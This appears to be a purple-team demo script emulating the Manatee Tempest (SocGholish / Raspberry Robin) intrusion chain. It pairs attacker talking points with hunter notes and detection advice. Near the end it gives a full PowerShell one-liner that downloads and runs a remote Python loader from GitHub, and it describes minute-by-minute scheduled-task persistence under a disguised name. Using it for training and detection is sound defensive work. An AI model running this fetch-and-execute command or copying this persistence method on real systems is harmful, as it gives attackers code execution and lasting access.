Manatee Tempest Simulation: Demo Script
1. The Narrative (Introduction)
The Actor: Manatee Tempest (SocGholish / Raspberry Robin).

The Scenario: A user has been tricked into executing a small command. We are now observing the "Stage 1" transition where the attacker establishes a permanent, recurring foothold using native Windows binaries (LOLBins).

2. Execution Steps & Talking Points
Step A: The Ingress (Living off the Land)
Action: Run the PowerShell command.

Narrative: "We start with a single line of PowerShell. Notice we aren't using an .exe installer. We use curl.exe to pull a legitimate Python environment and our loader from GitHub. This bypasses many basic file-reputation filters because the traffic goes to a trusted domain".

Hunter Note: Watch for powershell.exe or cmd.exe spawning curl.exe followed by a large file download to C:\ProgramData.

Step B: Payload Delivery & Environment Discovery
Action: Python script executes and downloads the DLL.

Narrative: "Our loader now fetches the payload: TEST_Dll1.dll. Unlike simple malware, this DLL is environment-aware. It uses the GetModuleFileNameA API to identify its own path at runtime, allowing it to function correctly regardless of where we hide it on the disk".

Visual Check: Show the DLL appearing in C:\ProgramData.

Step C: Persistence (The Heartbeat)
Action: Task creation.

Narrative: "To ensure we don't lose access, we create a Scheduled Task named WinUpdate_DLL. We set the frequency to 1 minute. This is our 'Persistence Anchor.' Even if the process is killed, the Windows Task Scheduler will re-inject our code into the system every 60 seconds".

Technical Check: Run schtasks /query /tn "WinUpdate_DLL" /v.

Step D: Validation (The Log)
Action: Wait for the task to fire; open hello.log.

Narrative: "The task has fired. We see hello.log being updated. Crucially, the process running our code is rundll32.exe, but it was started by taskhostw.exe. This 'orphaned' lineage is a high-confidence indicator of a persistence mechanism being triggered".

3. Summary for Security Analysts
Detection Strategy: Don't just hunt for filenames. Hunt for Process Lineage (TaskHost -> RunDLL32) and Frequency Anomalies (processes starting exactly every 60 seconds).

Impact: This access is what Manatee Tempest sells to ransomware operators to facilitate the final encryption stage.

DEMO Execition (Stage 0):
powershell.exe -Command "curl.exe -L https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip -o C:\ProgramData\python.zip; curl.exe -L https://raw.githubusercontent.com/adstudy182-debug/Demo_Work/refs/heads/main/V1/stage1.py -o C:\ProgramData\hklib.py; Expand-Archive -LiteralPath C:\ProgramData\python.zip -DestinationPath C:\ProgramData\py3 -Force; del C:\ProgramData\python.zip; & C:\ProgramData\py3\python.exe C:\ProgramData\hklib.py"